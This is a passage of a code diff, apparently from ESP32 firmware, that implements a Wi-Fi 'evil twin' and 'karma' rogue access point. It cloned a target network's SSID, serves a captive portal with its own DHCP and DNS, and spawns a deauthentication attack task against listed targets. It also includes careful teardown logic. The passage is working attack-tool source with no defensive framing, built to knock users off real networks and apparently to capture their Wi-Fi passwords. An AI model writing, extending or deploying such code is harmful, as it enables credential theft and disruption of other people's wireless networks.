+    if (admitted.ap.channel != config.ap.channel) return ESP_ERR_INVALID_ARG;
+    rc = esp_wifi_start();
+    if (rc != ESP_OK) return rc;
+    apply_wifi_power_settings();
+    esp_netif_ip_info_t ip = { .ip.addr = esp_ip4addr_aton("172.0.0.1"),
+        .gw.addr = esp_ip4addr_aton("172.0.0.1"), .netmask.addr = esp_ip4addr_aton("255.255.255.0") };
+    rc = cym_dhcp_server_configure(netif, &ip);
+    if (rc != ESP_OK) return rc;
+    memcpy(evilTwinSSID, snap->ssid, sizeof(evilTwinSSID));
+    memcpy(evilTwinPassword, snap->pass, sizeof(evilTwinPassword));
+    karma_mode = snap->kind != AP_REQ_EVIL_TWIN;
+    connectAttemptCount = 0; last_password_wrong = false;
+    if (snap->kind == AP_REQ_EVIL_TWIN) {
+        rc = esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, evil_twin_event_handler, NULL);
+        if (rc == ESP_OK) ap_evil_handler_owned = true;
+    } else {
+        rc = esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, portal_event_handler, NULL);
+        if (rc == ESP_OK) ap_portal_handler_owned = true;
+    }
+    if (rc != ESP_OK) return rc;
+    rc = start_portal_services();
+    if (rc != ESP_OK) return rc;
+    if (s_apctx->target_count) {
+        if (deauth_attack_task_handle) return ESP_ERR_INVALID_STATE;
+        deauth_attack_active = true;
+        if (xTaskCreate(deauth_attack_task, "deauth_attack", 8192, s_apctx, 3, &deauth_attack_task_handle) != pdPASS) {
+            deauth_attack_active = false; return ESP_ERR_NO_MEM;
+        }
+    }
+    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
+    return ESP_OK;
+}
+
+static esp_err_t ap_stop_owned(void) {
+    /* No attack resources acquired: never stop another feature's deauth/STA. */
+    if (!s_apctx->radio_touched && !ap_evil_handler_owned && !ap_portal_handler_owned &&
+        !portal_server && !dns_server_task_handle) return ESP_OK;
+    /* Worker is the sole teardown caller. HTTP callbacks never stop themselves. */
+    portENTER_CRITICAL(&s_ap_spin);
+    __atomic_store_n(&portal_active, false, __ATOMIC_RELEASE);
+    portEXIT_CRITICAL(&s_ap_spin);
+    esp_err_t rc = stop_portal_services();
+    if (rc != ESP_OK) return rc;
+    for (int i = 0; i < 50; ++i) {
+        portENTER_CRITICAL(&s_ap_spin);
+        bool pending = ap_event_inflight != 0;
+        portEXIT_CRITICAL(&s_ap_spin);
+        if (!pending) break;
+        if (i == 49) return ESP_ERR_TIMEOUT;
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    deauth_attack_active = false;
+    for (int i = 0; i < 50 && deauth_attack_task_handle; ++i) vTaskDelay(pdMS_TO_TICKS(100));
+    if (deauth_attack_task_handle) return ESP_ERR_TIMEOUT;
+    if (ap_evil_handler_owned) {
+        rc = esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, evil_twin_event_handler);
+        if (rc != ESP_OK) return rc;
+        ap_evil_handler_owned = false;
+    }
+    if (ap_portal_handler_owned) {
+        rc = esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, portal_event_handler);
+        if (rc != ESP_OK) return rc;
+        ap_portal_handler_owned = false;
+    }
+    if (!s_apctx->radio_touched) return ESP_OK;
+    rc = esp_wifi_stop();
+    if (rc != ESP_OK && rc != ESP_ERR_WIFI_NOT_STARTED) return rc;
+    rc = esp_wifi_set_mode(WIFI_MODE_STA);
+    if (rc != ESP_OK) return rc;
+    rc = esp_wifi_start();
+    if (rc != ESP_OK) return rc;
+    wifi_mode_t mode;
+    rc = esp_wifi_get_mode(&mode);
+    if (rc != ESP_OK) return rc;
+    if (mode != WIFI_MODE_STA) return ESP_FAIL;
+    s_apctx->radio_touched = false;
+    karma_mode = false;
+    return ESP_OK;
 }
 
 // ============================================================================
